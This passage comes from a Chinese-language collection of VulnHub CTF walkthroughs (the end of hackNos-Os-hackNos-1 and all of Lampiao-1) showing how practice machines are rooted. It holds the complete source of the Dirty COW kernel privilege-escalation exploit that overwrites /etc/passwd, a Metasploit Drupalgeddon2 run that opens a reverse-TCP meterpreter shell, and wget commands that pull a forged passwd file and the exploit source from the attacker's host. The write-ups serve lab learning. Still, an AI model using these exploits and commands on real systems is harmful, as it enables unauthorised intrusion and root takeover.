www-data@hackNos:/etc$ wget http://192.168.56.102:8000/passwd -O passwd
wget http://192.168.56.102:8000/passwd -O passwd
--2019-12-23 09:00:24--  http://192.168.56.102:8000/passwd
Connecting to 192.168.56.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1687 (1.6K) [application/octet-stream]
Saving to: 'passwd'

passwd              100%[===================>]   1.65K  --.-KB/s    in 0s      

2019-12-23 09:00:24 (405 MB/s) - 'passwd' saved [1687/1687]
```

成功下载并替换,然后登录root用户

``` bash
www-data@hackNos:/etc$ su lucifer11
su lucifer11
Password: passwd

bash: /bin/bash/.bashrc: Not a directory
root@hackNos:/etc# id
id
uid=0(root) gid=0(root) groups=0(root)
root@hackNos:/etc# whoami
whoami
root
```

找到flag,帅掉渣

``` bash
root@hackNos:/etc# cd /root
cd /root
root@hackNos:/root# ls
ls
root.txt
root@hackNos:/root# cat root.txt
cat root.txt
    _  _                              _   
  _| || |_                           | |  
 |_  __  _|______  _ __  ___    ___  | |_ 
  _| || |_|______|| '__|/ _ \  / _ \ | __|
 |_  __  _|       | |  | (_) || (_) || |_ 
   |_||_|         |_|   \___/  \___/  \__|
                                          
                                          

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b

Author : Rahul Gehlaut

Linkedin : https://www.linkedin.com/in/rahulgehlaut/

Blog : www.hackNos.com
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub86.jpg)

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end hackNos-Os-hackNos-1 -->

</details>

<a id="case-lampiao-1"></a>

## 应用入口与 Dirty COW 分支

Drupalgeddon2 提供初始执行，后半段按照目标内核和编译器验证 Dirty COW。原始编译参数、账户文件变化与结果均留存。

<p class="kb-provenance">来源 Lampiao-1 · 原记录 2020-04-07 · 9 个代码块 · 3 处图片引用</p>

<details class="kb-evidence" id="record-lampiao-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Lampiao-1 -->

#### 名称
名称：Lampião: 1
发布日期：2018年7月28日

#### 下载

Lampiao.zip

 - Download: https://mega.nz/#!aG4AAaDB!CBLRRYQsAhTOyPJqyjC0Blr-weMH9QMdYbPfMj0LGeM
 - Download (Mirror): https://download.vulnhub.com/lampiao/Lampiao.zip
 - Download (Torrent): https://download.vulnhub.com/lampiao/Lampiao.zip.torrent

#### 描述

您想继续在自己的实验室中进行黑客入侵吗？
试试这个全新的脆弱机器！“Lampião1”。root它！

级别：简单



#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.66.*
Nmap scan report for 192.168.66.17
Host is up (0.00024s latency).
MAC Address: 00:0C:29:51:75:B7 (VMware)
```

``` bash
root@kali:~# nmap -sV -p- -v 192.168.66.17
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http?
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

``` bash
root@kali:~# nmap -A -p 22,80,1898 -v 192.168.66.17 --script=vuln
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http?
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   NULL: 
|     _____ _ _ 
|     |_|/ ___ ___ __ _ ___ _ _ 
|     \x20| __/ (_| __ \x20|_| |_ 
|     ___/ __| |___/ ___|__,_|___/__, ( ) 
|     |___/ 
|     ______ _ _ _ 
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.66.17
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.66.17:1898/
|     Form id: user-login-form
|     Form action: /?q=node&destination=node
|     
|     Path: http://192.168.66.17:1898/?q=node/3
|     Form id: user-login-form
|     Form action: /?q=node/3&destination=node/3
|     
|     Path: http://192.168.66.17:1898/?q=node/1
|     Form id: user-login-form
|     Form action: /?q=node/1&destination=node/1
|     
|     Path: http://192.168.66.17:1898/?q=user/login&amp;destination=node/3%23comment-form
|     Form id: user-login
|     Form action: /?q=user/login&amp;destination=node/3%23comment-form
|     
|     Path: http://192.168.66.17:1898/?q=user/register&amp;destination=node/1%23comment-form
|     Form id: user-register-form
|     Form action: /?q=user/register&amp;destination=node/1%23comment-form
|     
|     Path: http://192.168.66.17:1898/?q=user/login&amp;destination=node/1%23comment-form
|     Form id: user-login
|     Form action: /?q=user/login&amp;destination=node/1%23comment-form
|     
|     Path: http://192.168.66.17:1898/?q=user/password
|     Form id: user-pass
|     Form action: /?q=user/password
|     
|     Path: http://192.168.66.17:1898/?q=node&amp;destination=node
|     Form id: user-login-form
|     Form action: /?q=node&destination=node%3Famp%253Bdestination%3Dnode
|     
|     Path: http://192.168.66.17:1898/?q=user/register&amp;destination=node/3%23comment-form
|     Form id: user-register-form
|     Form action: /?q=user/register&amp;destination=node/3%23comment-form
|     
|     Path: http://192.168.66.17:1898/?q=user/register
|     Form id: user-register-form
|     Form action: /?q=user/register
|     
|     Path: http://192.168.66.17:1898/?q=node/3&amp;destination=node/3
|     Form id: user-login-form
|     Form action: /?q=node/3&destination=node/3%3Famp%253Bdestination%3Dnode/3
|     
|     Path: http://192.168.66.17:1898/?q=node/1&amp;destination=node/1
|     Form id: user-login-form
|     Form action: /?q=node/1&destination=node/1%3Famp%253Bdestination%3Dnode/1
|     
|     Path: http://192.168.66.17:1898/?q=user/login&amp;amp;destination=node/3%23comment-form
|     Form id: user-login
|_    Form action: /?q=user/login&amp;amp;destination=node/3%23comment-form
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|   /UPGRADE.txt: Drupal file
|   /INSTALL.txt: Drupal file
|   /INSTALL.mysql.txt: Drupal file
|   /INSTALL.pgsql.txt: Drupal file
|   /CHANGELOG.txt: Drupal v1
|   /: Drupal version 7 
|   /README.txt: Interesting, a readme.
|   /includes/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /misc/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /modules/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|   /sites/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_  /themes/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.7: 
|       CVE-2020-1934   7.5     https://vulners.com/cve/CVE-2020-1934
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
```

Nmap扫描显示端口22、80、1898已打开，因此考虑在浏览器中打开IP地址以及端口1898。它提供了有关运行了Drupal的网页的线索。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub240.jpg)

根据先前的线索，考虑过使用漏洞利用drupal_drupalgeddon2进行利用。

``` bash
msf5 > search drupalgeddon2

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection


msf5 > use exploit/unix/webapp/drupal_drupalgeddon2
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.66.17
RHOSTS => 192.168.66.17
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 1898
RPORT => 1898
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.66.6:4444 
[*] Sending stage (38288 bytes) to 192.168.66.17
[*] Meterpreter session 1 opened (192.168.66.6:4444 -> 192.168.66.17:58696) at 2020-04-07 22:59:18 -0400

meterpreter > 
meterpreter > sessions 1
[*] Session 1 is already interactive.
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100755/rwxr-xr-x  110781   fil   2018-04-19 15:39:33 -0400  CHANGELOG.txt
100755/rwxr-xr-x  1481     fil   2018-04-19 15:39:33 -0400  COPYRIGHT.txt
100755/rwxr-xr-x  1717     fil   2018-04-19 15:39:33 -0400  INSTALL.mysql.txt
100755/rwxr-xr-x  1874     fil   2018-04-19 15:39:33 -0400  INSTALL.pgsql.txt
100755/rwxr-xr-x  1298     fil   2018-04-19 15:39:33 -0400  INSTALL.sqlite.txt
100755/rwxr-xr-x  17995    fil   2018-04-19 15:39:33 -0400  INSTALL.txt
100755/rwxr-xr-x  18092    fil   2018-04-19 15:39:33 -0400  LICENSE.txt
100644/rw-r--r--  3427612  fil   2018-04-20 13:20:38 -0400  LuizGonzaga-LampiaoFalou.mp3
100755/rwxr-xr-x  8710     fil   2018-04-19 15:39:33 -0400  MAINTAINERS.txt
100755/rwxr-xr-x  5382     fil   2018-04-19 15:39:33 -0400  README.txt
100755/rwxr-xr-x  10123    fil   2018-04-19 15:39:33 -0400  UPGRADE.txt
100644/rw-r--r--  34715    fil   2018-04-20 13:09:26 -0400  audio.m4a
100755/rwxr-xr-x  6604     fil   2018-04-19 15:39:33 -0400  authorize.php
100755/rwxr-xr-x  720      fil   2018-04-19 15:39:33 -0400  cron.php
40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  includes
100755/rwxr-xr-x  529      fil   2018-04-19 15:39:33 -0400  index.php
100755/rwxr-xr-x  703      fil   2018-04-19 15:39:33 -0400  install.php
100755/rwxr-xr-x  267732   fil   2015-08-03 22:51:40 -0400  lampiao.jpg
40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  misc
40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  modules
40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  profiles
100644/rw-r--r--  9674     fil   2018-04-20 12:48:37 -0400  qrc.png
100755/rwxr-xr-x  2189     fil   2018-04-19 15:39:33 -0400  robots.txt
40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  scripts
40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  sites
40755/rwxr-xr-x   4096     dir   2018-04-19 15:39:33 -0400  themes
100755/rwxr-xr-x  19986    fil   2018-04-19 15:39:33 -0400  update.php
100755/rwxr-xr-x  2200     fil   2018-04-19 15:39:33 -0400  web.config
100755/rwxr-xr-x  417      fil   2018-04-19 15:39:33 -0400  xmlrpc.php

meterpreter > shell
Process 4649 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
pwd
/var/www/html
```

现在已经有了meterpreter，因此考虑使用以下命令检查有关受害者机器的描述：


``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@lampiao:/var/www/html$ lsb_release -a
lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.5 LTS
Release:        14.04
Codename:       trusty
```

该说明从“受害者机器的版本号”中提供了非常有力的暗示，供下一步使用。

在使用较早的有关版本号的线索进行长时间搜索之后，终于找到了所需的漏洞，并将其下载到了计算机上。

 - [Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法](https://www.exploit-db.com/exploits/40847)

即脏牛提权

40847.cpp

``` bash
// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
// EDB-Note: Recommended way to run:   ./dcow -s    (Will automatically do "echo 0 > /proc/sys/vm/dirty_writeback_centisecs")
//
// -----------------------------------------------------------------
// Copyright (C) 2016  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software Foundation,
// Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA
// -----------------------------------------------------------------

#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <pty.h>
#include <string.h>
#include <termios.h>
#include <sys/wait.h>
#include <signal.h>

#define  BUFFSIZE    1024
#define  PWDFILE     "/etc/passwd"
#define  BAKFILE     "./.ssh_bak"
#define  TMPBAKFILE  "/tmp/.ssh_bak"
#define  PSM         "/proc/self/mem"
#define  ROOTID      "root:"
#define  SSHDID      "sshd:"
#define  MAXITER     300
#define  DEFPWD      "$6$P7xBAooQEZX/ham$9L7U0KJoihNgQakyfOQokDgQWLSTFZGB9LUU7T0W2kH1rtJXTzt9mG4qOoz9Njt.tIklLtLosiaeCBsZm8hND/"
#define  TXTPWD      "dirtyCowFun\n"
#define  DISABLEWB   "echo 0 > /proc/sys/vm/dirty_writeback_centisecs\n"
#define  EXITCMD     "exit\n"
#define  CPCMD       "cp "
#define  RMCMD       "rm "

using namespace std;

class Dcow{
    private:
       bool              run,        rawMode,     opShell,   restPwd;
       void              *map;
       int               fd,         iter,        master,    wstat;
       string            buffer,     etcPwd,      etcPwdBak,
                         root,       user,        pwd,       sshd;
       thread            *writerThr, *madviseThr, *checkerThr;
       ifstream          *extPwd;
       ofstream          *extPwdBak;
       struct passwd     *userId;
       pid_t             child;  
       char              buffv[BUFFSIZE];
       fd_set            rfds;
       struct termios    termOld,    termNew;
       ssize_t           ign;

       void exitOnError(string msg);
    public:
       Dcow(bool opSh, bool rstPwd);
       ~Dcow(void);
       int  expl(void);         
};

Dcow::Dcow(bool opSh, bool rstPwd) : run(true), rawMode(false), opShell(opSh), restPwd(rstPwd),
                   iter(0), wstat(0), root(ROOTID), pwd(DEFPWD), sshd(SSHDID), writerThr(nullptr),
                   madviseThr(nullptr), checkerThr(nullptr), extPwd(nullptr), extPwdBak(nullptr), 
                   child(0){ 
   userId = getpwuid(getuid());
   user.append(userId->pw_name).append(":");
   extPwd = new ifstream(PWDFILE);   
   while (getline(*extPwd, buffer)){
       buffer.append("\n");
       etcPwdBak.append(buffer);
       if(buffer.find(root) == 0){
          etcPwd.insert(0, root).insert(root.size(), pwd);
          etcPwd.insert(etcPwd.begin() + root.size() + pwd.size(), 
                        buffer.begin() + buffer.find(":", root.size()), buffer.end());
       }else if(buffer.find(user) == 0 ||  buffer.find(sshd) == 0 ){
          etcPwd.insert(0, buffer);
       }else{
          etcPwd.append(buffer);
       }
   }
   extPwdBak = new ofstream(restPwd ? TMPBAKFILE : BAKFILE);
   extPwdBak->write(etcPwdBak.c_str(), etcPwdBak.size());
   extPwdBak->close();
   fd = open(PWDFILE,O_RDONLY);
   map = mmap(nullptr, etcPwdBak.size(), PROT_READ,MAP_PRIVATE, fd, 0);
}

Dcow::~Dcow(void){
   extPwd->close();
   close(fd);
   delete extPwd; delete extPwdBak; delete madviseThr; delete writerThr; delete checkerThr;
   if(rawMode)    tcsetattr(STDIN_FILENO, TCSANOW, &termOld);
   if(child != 0) wait(&wstat); 
}

void Dcow::exitOnError(string msg){
      cerr << msg << endl;
      // if(child != 0) kill(child, SIGKILL);
      throw new exception();
}

int  Dcow::expl(void){
   madviseThr = new thread([&](){ while(run){ madvise(map, etcPwdBak.size(), MADV_DONTNEED);} });
   writerThr  = new thread([&](){ int fpsm = open(PSM,O_RDWR);  
                                  while(run){ lseek(fpsm, reinterpret_cast<off_t>(map), SEEK_SET); 
                                              ign = write(fpsm, etcPwd.c_str(), etcPwdBak.size()); }
                                });
   checkerThr = new thread([&](){ while(iter <= MAXITER){ 
                                         extPwd->clear(); extPwd->seekg(0, ios::beg); 
                                         buffer.assign(istreambuf_iterator<char>(*extPwd),
                                                       istreambuf_iterator<char>());
                                         if(buffer.find(pwd) != string::npos && 
                                            buffer.size() >= etcPwdBak.size()){
                                                run = false; break;
                                         }
                                         iter ++; usleep(300000);
                                   }
                                   run = false;
                                 });

  cerr << "Running ..." << endl;
  madviseThr->join();
  writerThr->join();
  checkerThr->join();

  if(iter <= MAXITER){ 
       child = forkpty(&master, nullptr, nullptr, nullptr);

       if(child == -1) exitOnError("Error forking pty.");

       if(child == 0){ 
          execlp("su", "su", "-", nullptr);
          exitOnError("Error on exec.");
       }

       if(opShell) cerr << "Password overridden to: " <<  TXTPWD << endl;
       memset(buffv, 0, BUFFSIZE);
       ssize_t bytes_read = read(master, buffv, BUFFSIZE - 1);
       if(bytes_read <= 0) exitOnError("Error reading  su prompt.");
       cerr << "Received su prompt (" << buffv << ")" << endl; 

       if(write(master, TXTPWD, strlen(TXTPWD)) <= 0) 
            exitOnError("Error writing pwd on tty.");

       if(write(master, DISABLEWB, strlen(DISABLEWB)) <= 0) 
            exitOnError("Error writing cmd on tty.");

       if(!opShell){
            if(write(master, EXITCMD, strlen(EXITCMD)) <= 0) 
                 exitOnError("Error writing exit cmd on tty.");
       }else{
           if(restPwd){
               string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(" ").append(PWDFILE).append("\n");
               if(write(master, restoreCmd.c_str(), restoreCmd.size()) <= 0) 
                    exitOnError("Error writing restore cmd on tty.");
               restoreCmd        = string(RMCMD).append(TMPBAKFILE).append("\n");
               if(write(master, restoreCmd.c_str(), restoreCmd.size()) <= 0) 
                    exitOnError("Error writing restore cmd (rm) on tty.");
           }

           if(tcgetattr(STDIN_FILENO, &termOld) == -1 )
                exitOnError("Error getting terminal attributes.");
    
           termNew               = termOld;
           termNew.c_lflag       &= static_cast<unsigned long>(~(ICANON | ECHO));
    
           if(tcsetattr(STDIN_FILENO, TCSANOW, &termNew) == -1)
                exitOnError("Error setting terminal in non-canonical mode.");
           rawMode = true;
    
           while(true){
                FD_ZERO(&rfds);
                FD_SET(master, &rfds);
                FD_SET(STDIN_FILENO, &rfds);
    
                if(select(master + 1, &rfds, nullptr, nullptr, nullptr) < 0 )
                    exitOnError("Error on select tty.");
    
                if(FD_ISSET(master, &rfds)) {
                    memset(buffv, 0, BUFFSIZE);
                    bytes_read = read(master, buffv, BUFFSIZE - 1);
                    if(bytes_read <= 0) break;
                    if(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)
                          exitOnError("Error writing on stdout.");
                }
    
                if(FD_ISSET(STDIN_FILENO, &rfds)) {
                    memset(buffv, 0, BUFFSIZE);
                    bytes_read = read(STDIN_FILENO, buffv, BUFFSIZE - 1);
                    if(bytes_read <= 0) exitOnError("Error reading from stdin.");
                    if(write(master, buffv, bytes_read) != bytes_read) break;
                }
            }
      }
  }
 
  return [](int ret, bool shell){ 
       string msg = shell ? "Exit.\n" : string("Root password is:   ") + TXTPWD + "Enjoy! :-)\n";
       if(ret <= MAXITER){cerr << msg; return 0;}
       else{cerr << "Exploit failed.\n"; return 1;} 
  }(iter, opShell);
}

void printInfo(char* cmd){
      cerr << cmd << " [-s] [-n] | [-h]\n" << endl;
      cerr << " -s  open directly a shell, if the exploit is successful;" << endl;
      cerr << " -n  combined with -s, doesn't restore the passwd file." << endl;
      cerr << " -h  print this synopsis;" << endl;
      cerr << "\n If no param is specified, the program modifies the passwd file and exits." << endl;
      cerr << " A copy of the passwd file will be create in the current directory as .ssh_bak" << endl;
      cerr << " (unprivileged user), if no parameter or -n is specified.\n" << endl;
      exit(1);
}

int main(int argc, char** argv){
   const char  flags[]   = "shn";
   int         c;
   bool        opShell   = false,
               restPwd   = true;

   opterr = 0;
   while ((c = getopt(argc, argv, flags)) != -1){
      switch (c){
         case 's':
            opShell = true;
         break;
         case 'n':
            restPwd = false;
         break;
         case 'h':
            printInfo(argv[0]);
         break;
         default:
            cerr << "Invalid parameter." << endl << endl;
            printInfo(argv[0]);
      }
   }

   if(!restPwd && !opShell){
            cerr << "Invalid parameter: -n requires -s" << endl << endl;
            printInfo(argv[0]);
   }

   Dcow dcow(opShell, restPwd);
   return dcow.expl();
}
```

执行一个python服务器，它将帮助通过Victim的计算机下载漏洞利用程序。

kali端执行

``` bash
root@kali:~/vulnhub/lampiao# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.66.1 - - [08/Apr/2020 01:48:23] code 404, message File not found
192.168.66.1 - - [08/Apr/2020 01:48:23] "GET /robots.txt HTTP/1.1" 404 -
192.168.66.1 - - [08/Apr/2020 01:48:23] "GET / HTTP/1.1" 200 -
192.168.66.1 - - [08/Apr/2020 01:48:24] code 404, message File not found
192.168.66.1 - - [08/Apr/2020 01:48:24] "GET /favicon.ico HTTP/1.1" 404 -
192.168.66.17 - - [08/Apr/2020 01:49:04] "GET /40847.cpp HTTP/1.1" 200 -
```

受害者执行

``` bash
www-data@lampiao:/var/www/html$ cd /tmp
cd /tmp
www-data@lampiao:/tmp$ ls
ls
www-data@lampiao:/tmp$ wget http://192.168.66.6:8000/40847.cpp
wget http://192.168.66.6:8000/40847.cpp
--2020-04-08 01:45:33--  http://192.168.66.6:8000/40847.cpp
Connecting to 192.168.66.6:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10531 (10K) [text/x-c++src]
Saving to: '40847.cpp'

100%[======================================>] 10,531      --.-K/s   in 0s      

2020-04-08 01:45:33 (391 MB/s) - '40847.cpp' saved [10531/10531]

www-data@lampiao:/tmp$ ls
ls
40847.cpp
```

现在已将此文件下载到服务器的/tmp（通用可写）目录中。由于该漏洞利用程序采用.cpp格式进行编译和执行，因此该漏洞利用程序代码中提供了特定的命令。这提供了有关如何编译和执行漏洞40847.ccp的提示。

现在有了root权限的shell！现在读取该flag。

``` bash
www-data@lampiao:/tmp$ ls
ls
40847.cpp
www-data@lampiao:/tmp$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
<-Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil            
www-data@lampiao:/tmp$ ./dcow -s
./dcow -s
Running ...
Password overridden to: dirtyCowFun

Received su prompt (Password: )

echo 0 > /proc/sys/vm/dirty_writeback_centisecs
cp /tmp/.ssh_bak /etc/passwd
rm /tmp/.ssh_bak
root@lampiao:~# echo 0 > /proc/sys/vm/dirty_writeback_centisecs
root@lampiao:~# cp /tmp/.ssh_bak /etc/passwd
root@lampiao:~# rm /tmp/.ssh_bak
root@lampiao:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@lampiao:~# whoami
whoami
root
root@lampiao:~# cd /root
cd /root
root@lampiao:~# ls
ls
flag.txt
root@lampiao:~# cat flag.txt
cat flag.txt
9740616875908d91ddcdaa8aea3af366
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub241.jpg)

#### 知识点总结

 - msf drupal_drupalgeddon2漏洞利用
 - Linux内核2.6.22-3.9-Dirty-COW-/proc/self/mem-竞争条件提权-/etc/passwd方法（脏牛提权）

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>







<!-- kb:end Lampiao-1 -->

</details>

